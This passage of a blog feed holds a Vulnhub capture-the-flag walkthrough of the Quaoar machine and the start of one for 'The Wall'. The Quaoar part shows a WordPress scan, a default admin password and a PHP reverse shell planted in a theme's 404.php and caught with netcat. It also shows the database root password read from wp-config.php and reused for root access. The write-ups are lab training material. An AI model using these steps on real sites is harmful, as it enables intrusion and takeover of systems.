&lt;img src=&quot;/img/quaoar/htp2.png&quot; alt=&quot;Hack_The_Planet_2&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let's take a look at &lt;b&gt;robots.txt&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Disallow: Hackers
Allow: /wordpress/
   ____                              
&lt;span class=&quot;c&quot;&gt;#  /___ \_   _  __ _  ___   __ _ _ __&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# //  / / | | |/ _` |/ _ \ / _` | '__|&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#/ \_/ /| |_| | (_| | (_) | (_| | |   &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#\___,_\ \__,_|\__,_|\___/ \__,_|_|   &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Wordpress directory? Seems interesting. By looking at the source code, we know that it's an old version of this CMS. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;generator&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;WordPress 3.9.14&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's run a &lt;b&gt;wpscan&lt;/b&gt;, while in meantime I decided to look for common usernames on the &lt;b&gt;wp-login&lt;/b&gt; page. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# wpscan &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://192.168.56.102/wordpress
_______________________________________________________________
        __          _______   _____                  
        &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;       / /  __ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ ____|                 
         &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt; /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; / /| |__&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___   ___  __ _ _ __  
          &lt;span class=&quot;se&quot;&gt;\ \/&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; / |  ___/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ __|/ _ | _ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
           &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /  | |     ____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;__| &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| | | | |
            &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;   |_|    |_____/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] URL: http://192.168.56.102/wordpress/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Started: Sat Aug 19 08:30:02 2017

&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; The WordPress &lt;span class=&quot;s1&quot;&gt;'http://192.168.56.102/wordpress/readme.html'&lt;/span&gt; file exists exposing a version number
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Interesting header: SERVER: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Interesting header: X-POWERED-BY: PHP/5.3.10-1ubuntu3
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] XML-RPC Interface available under: http://192.168.56.102/wordpress/xmlrpc.php
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Upload directory has directory listing enabled: http://192.168.56.102/wordpress/wp-content/uploads/

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress version 3.9.14 identified from meta generator

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress theme &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;use: twentyfourteen - v1.1

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Name: twentyfourteen - v1.1
 |  Location: http://192.168.56.102/wordpress/wp-content/themes/twentyfourteen/
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; The version is out of date, the latest version is 1.6
 |  Style URL: http://192.168.56.102/wordpress/wp-content/themes/twentyfourteen/style.css
 |  Referenced style.css: wp-content/themes/twentyfourteen/style.css
 |  Theme Name: Twenty Fourteen
 |  Theme URI: http://wordpress.org/themes/twentyfourteen
 |  Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern des...
 |  Author: the WordPress team
 |  Author URI: http://wordpress.org/

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Enumerating plugins from passive detection ...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] No plugins found

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Finished: Sat Aug 19 08:30:05 2017
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Requests Done: 41
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Memory used: 8.387 MB
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Elapsed &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 00:00:03&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But wait, there's an &lt;b&gt;admin&lt;/b&gt; account? &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/quaoar/wp-admin.png&quot; alt=&quot;Admin login&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And there's even more, password of this account is simply &lt;b&gt;admin&lt;/b&gt;! Now we're in the administrator panel of Wordpress, from where we can deploy a &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;PHP Reverse Shell&lt;/a&gt;. &lt;/p&gt;

&lt;p&gt;Reemeber to change the IP address. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$VERSION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'192.168.56.103'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$chunk_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$write_a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$error_a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'uname -a; w; id; /bin/sh -i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$daemon&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$debug&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;To put it in the site, I decided to modify the code of &lt;b&gt;404.php&lt;/b&gt; page from the theme. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/quaoar/wp-shell.png&quot; alt=&quot;Shell&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then, we only have to set up the listener and navigate to the url of the page. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;192.168.56.102/wordpress/wp-content/themes/twentyfourteen/404.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1234
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
192.168.56.102: inverse host lookup failed: Unknown host
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.103] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.102] 51795
Linux Quaoar 3.2.0-23-generic-pae &lt;span class=&quot;c&quot;&gt;#36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux&lt;/span&gt;
 11:00:33 up 40 min,  0 users,  load average: 0.01, 0.05, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's look for flags! I've found the first one in &lt;b&gt;/home&lt;/b&gt; directory. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 12
drwxr-xr-x  3 root root 4096 Oct 24  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 22 root root 4096 Oct  7  2016 ..
drwxr-xr-x  2 root root 4096 Oct 22  2016 wpadmin
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wpadmin
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 12
drwxr-xr-x 2 root    root    4096 Oct 22  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 root    root    4096 Oct 24  2016 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 wpadmin wpadmin   33 Oct 22  2016 flag.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
2bafe61f03117ac66a73c3c514de796e&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now, it's time to escalate our privilages. And to my amusement, in &lt;b&gt;wp-config.php&lt;/b&gt; there was root password for &lt;b&gt;mysql&lt;/b&gt; database. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
www-data@Quaoar:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;var/www
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;var/www
www-data@Quaoar:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 3628
drwxr-xr-x  6 www-data www-data   4096 Oct 24  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 13 root     root       4096 Jan 15  2017 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    224 Oct 12  2016 CHANGELOG
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data  35147 Oct 12  2016 COPYING
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 652654 Oct 23  2016 Hack_The_Planet.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 281003 Oct 23  2016 Hack_The_Planet2.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 126042 Oct 23  2016 Hack_The_Planet3.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data   1241 Oct 12  2016 INSTALL
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data   1672 Oct 12  2016 LICENSE
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 756701 Oct 23  2016 Quaoar.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    954 Oct 12  2016 README.md
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 169045 Oct 23  2016 hack-planet-1280-amox-zone.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 261593 Oct 23  2016 hack-planet-high-definition-mobile.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 179812 Oct 23  2016 hacker-manifesto-ethical.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 616848 Oct 23  2016 hacking.jpg
drwxr-xr-x  2 www-data www-data   4096 Oct 12  2016 hsperfdata_tomcat6
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    100 Oct 24  2016 index.html
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 573058 Oct 23  2016 pososibo-ethical-hacking-hack-fond.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    271 Oct 24  2016 robots.txt
drwxr-xr-x  2 www-data www-data   4096 Oct 12  2016 tomcat6-tomcat6-tmp
drwxr-xr-x 13 www-data www-data   4096 Oct 12  2016 upload
drwxr-xr-x  5 www-data www-data   4096 Nov 30  2016 wordpress
www-data@Quaoar:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wordpress
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wordpress
www-data@Quaoar:/var/www/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;wp-config.php

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database username &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USER'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database password &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'rootpassword!'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Will it work? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@Quaoar:/var/www/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su root
su root
Password: rootpassword!
root@Quaoar:/var/www/wordpress# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
root@Quaoar:~# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 48
drwx------  6 root root 4096 Nov 30  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 22 root root 4096 Oct  7  2016 ..
drwx------  2 root root 4096 Oct  7  2016 .aptitude
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root  368 Jan 15  2017 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root 3106 Apr 19  2012 .bashrc
drwx------  2 root root 4096 Oct 15  2016 .cache
&lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;  1 root root   33 Oct 22  2016 flag.txt
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  140 Apr 19  2012 .profile
drwx------  2 root root 4096 Oct 26  2016 .ssh
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root 4740 Nov 30  2016 .viminfo
drwxr-xr-x  8 root root 4096 Jan 29  2015 vmware-tools-distrib
root@Quaoar:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
8e3f9ec016e3598c5eec11fd3d73f6fb&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We have the last flag, together with the root access! &lt;/p&gt;
</description>
        <pubDate>Sat, 19 Aug 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub-quaoar/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-quaoar/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - The Wall</title>
        <description>&lt;p&gt;Hello everyone, today we're going to go through another machine from &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt; called &lt;b&gt;The Wall&lt;/b&gt;. Let's take a look at the description.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;In 1965, one of the most influential bands of our times was formed.. Pink Floyd. This boot2root box has been created to celebrate 50 years of Pink Floyd's contribution to the music industry, with each challenge giving the attacker an introduction to each member of the Floyd.

You challenge is simple... set your controls for the heart of the sun, get root, and grab the flag! Rock on!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Looks promising, let's start it. &lt;/p&gt;

&lt;p&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/xerubus,117/&quot;&gt;&lt;b&gt;Sagi&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/the-wall-1,130/&quot;&gt;&lt;b&gt;/dev/random/ Pipe&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;Write-Up&lt;/h1&gt;

&lt;p&gt;Attacker: &lt;b&gt;Kali Linux 192.168.56.102&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;Victim: &lt;b&gt;The Wall 192.168.56.103&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Firstly, we're going to do a comprehensive scan using &lt;b&gt;nmap&lt;/b&gt; in order to gain as much info as possible. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 192.168.56.103

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-08-02 10:24 EDT
NSE: Loaded 132 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:24
Completed NSE at 10:24, 0.00s elapsed
Initiating NSE at 10:24
Completed NSE at 10:24, 0.00s elapsed
Initiating ARP Ping Scan at 10:24
Scanning 192.168.56.103 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
Completed ARP Ping Scan at 10:24, 0.22s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Initiating SYN Stealth Scan at 10:24
Scanning 192.168.56.103 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
SYN Stealth Scan Timing: About 2.21% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 10:48 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:22:54 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 4.47% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 10:47 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:21:43 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;No open ports? A little bit strange, but after a while I noticed on &lt;b&gt;wireshark&lt;/b&gt;, that victim machine is trying to connect to port 1337. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/the-wall/wireshark.png&quot; alt=&quot;Wireshark&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I took a closer look at the packet. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;102 0.299005957 192.168.56.102 192.168.56.103 TCP 54 1337 → 45058 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And set up a listener. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1337
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1337 ...
192.168.56.103: inverse host lookup failed: Unknown host
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.102] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.103] 14489

                       .u!&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
                   .x&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
               ..+&lt;span class=&quot;s2&quot;&gt;&quot;NP
            .z&quot;&quot;   ?
          M#&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;      9     ,     ,
                   9 M  d! ,8P&lt;span class=&quot;s1&quot;&gt;'
                   R X.:x'&lt;/span&gt; R&lt;span class=&quot;s1&quot;&gt;'  ,
                   F F'&lt;/span&gt; M  R.d&lt;span class=&quot;s1&quot;&gt;'
                   d P  @  E`  ,
      ss           P  '&lt;/span&gt;  P  N.d&lt;span class=&quot;s1&quot;&gt;'
       x         ''        '&lt;/span&gt;
       X               x             &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
       9     .f       &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;
       4&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;$k&lt;/span&gt;      /         dH    &lt;span class=&quot;nv&quot;&gt;$f&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;'X   ;$$     z  .       MR   :$
        R   M$$,   :  d9b      M'&lt;/span&gt;   tM
        M:  &lt;span class=&quot;c&quot;&gt;#'$L  ;' M `8      X    MR&lt;/span&gt;
        &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;t' &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;  # X ,oR      t    Q;
